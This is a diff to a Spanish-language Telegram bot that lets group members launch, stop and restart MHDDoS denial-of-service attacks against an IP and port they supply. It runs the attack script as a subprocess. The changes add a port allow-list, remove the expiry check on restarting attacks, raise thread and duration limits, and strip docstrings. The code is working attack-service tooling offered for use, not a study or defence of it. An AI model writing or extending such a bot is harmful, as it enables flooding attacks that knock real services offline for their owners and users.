@@ -13,6 +13,7 @@ BOT_TOKEN = "TU_BOT_TOKEN"
 ADMIN_ID = TU_ADMIN_ID
 GROUP_LINK = "LINK_DE_TU_GRUPO"
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
+ALLOWED_PORTS = [10010, 10011, 10012, 10013, 10014, 10015, 10016, 10017, 10018, 10019]
 
 bot = telebot.TeleBot(BOT_TOKEN)
 db_lock = Lock()
@@ -37,48 +38,38 @@ if not os.path.exists(free_time_file):
         json.dump({}, f)
 
 def load_json(file_path):
-    """Carga un archivo JSON."""
     with open(file_path, "r") as f:
         return json.load(f)
 
 def save_json(file_path, data):
-    """Guarda datos en un archivo JSON."""
     with open(file_path, "w") as f:
         json.dump(data, f)
 
 def load_groups():
-    """Carga los grupos desde el archivo JSON."""
     return load_json(groups_file)["groups"]
 
 def save_groups(groups):
-    """Guarda los grupos en el archivo JSON."""
     save_json(groups_file, {"groups": groups})
 
 def load_users():
-    """Carga la lista de usuarios desde el archivo JSON."""
     return load_json(users_file)["users"]
 
 def save_users(users):
-    """Guarda la lista de usuarios en el archivo JSON."""
     save_json(users_file, {"users": users})
 
 def load_free_time():
-    """Carga el tiempo gratis desde el archivo JSON."""
     return load_json(free_time_file)
 
 def save_free_time(data):
-    """Guarda el tiempo gratis en el archivo JSON."""
     save_json(free_time_file, data)
 
 def add_user(user_id):
-    """Agrega un usuario a la lista si no está registrado."""
     users = load_users()
     if user_id not in users:
         users.append(user_id)
         save_users(users)
 
 def is_allowed(message):
-    """Verifica si el mensaje proviene de un grupo autorizado o si es del admin en privado."""
     groups = load_groups()
     user_id = message.from_user.id
 
@@ -97,11 +88,9 @@ def is_allowed(message):
     return False
 
 def is_admin(message):
-    """Verifica si el usuario es administrador del grupo."""
     return message.from_user.id == ADMIN_ID or message.from_user.id in [admin.user.id for admin in bot.get_chat_administrators(message.chat.id)]
 
 def generate_math_question(level):
-    """Genera una pregunta matemática aleatoria."""
     ops = {
         'easy': [(operator.add, '+'), (operator.sub, '-')],
         'normal': [(operator.add, '+'), (operator.sub, '-'), (operator.mul, '*')],
@@ -126,7 +115,6 @@ def generate_math_question(level):
     return question, answer
 
 def timeout_handler(message, answer, user_id, level):
-    """Maneja el tiempo límite de respuesta."""
     time.sleep(20)
     bot.send_message(message.chat.id, "❌ *Tiempo agotado. ¡Inténtalo de nuevo!*", parse_mode="Markdown")
 
@@ -285,6 +273,16 @@ def handle_ping(message):
     threads = int(args[3])
     duration = int(args[4])
 
+    try:
+        ip, port = ip_port.split(":")
+        port = int(port)
+        if port not in ALLOWED_PORTS:
+            bot.reply_to(message, f"❌ *Puerto no permitido.* Solo se permiten los puertos: {ALLOWED_PORTS}")
+            return
+    except ValueError:
+        bot.reply_to(message, "❌ *Formato de IP:Puerto inválido.*")
+        return
+
     if threads > 3:
         bot.reply_to(message, "❌ *El número máximo de hilos permitido es 3.*")
         return
@@ -363,7 +361,6 @@ def handle_stop_attack(call):
             print(f"Error al responder a la consulta de callback: {str(e)}")
 
 def delete_message(chat_id, message_id):
-    """Elimina el mensaje después de 20 segundos."""
     try:
         bot.delete_message(chat_id, message_id)
     except Exception as e:
@@ -388,12 +385,6 @@ def handle_restart_attack(call):
         )
         return
 
-    if telegram_id not in active_attacks:
-        bot.answer_callback_query(
-            call.id, "❌ *El tiempo para reiniciar el ataque ha expirado.*"
-        )
-        return
-
     last_command = cooldowns.get(f"last_command_{telegram_id}")
     if not last_command:
         try:
@@ -409,12 +400,12 @@ def handle_restart_attack(call):
         threads = int(args[3])
         duration = int(args[4])
 
-        if threads > 1:
-            bot.answer_callback_query(call.id, "❌ *El número máximo de hilos permitido es 1.*")
+        if threads > 3:
+            bot.answer_callback_query(call.id, "❌ *El número máximo de hilos permitido es 3.*")
             return
 
-        if duration > 480:
-            bot.answer_callback_query(call.id, "❌ *La duración máxima permitida es de 480 segundos (8 minutos).*")
+        if duration > 600:
+            bot.answer_callback_query(call.id, "❌ *La duración máxima permitida es de 600 segundos (10 minutos).*")
             return
 
         command = ["python", START_PY_PATH, attack_type, ip_port, str(threads), str(duration)]
@@ -612,7 +603,7 @@ def handle_broadcastgroup(message):
 
     for group_id in groups:
         try:
-            bot.send_message(group_id, f"📢 *Mensaje del admin:* {text}", parse_mode="Markdown")
+            bot.send_message(group_id, f"📢 {text}", parse_mode="Markdown")
             success_count += 1
         except Exception as e:
             fail_count += 1
@@ -621,7 +612,6 @@ def handle_broadcastgroup(message):
     bot.reply_to(message, f"✅ Mensaje enviado a {success_count} grupos. ❌ Falló en {fail_count}.")
 
 def notify_groups_bot_started():
-    """Notifica a los grupos que el bot ha sido encendido."""
     groups = load_groups()
     for group_id in groups:
         try:
@@ -636,7 +626,6 @@ def notify_groups_bot_started():
             print(f"No se pudo enviar mensaje al grupo {group_id}: {str(e)}")
 
 def check_shutdown_time():
-    """Verifica el tiempo restante y notifica a los grupos cuando falten 5 minutos."""
     start_time = time.time()
     while True:
         elapsed_time = time.time() - start_time
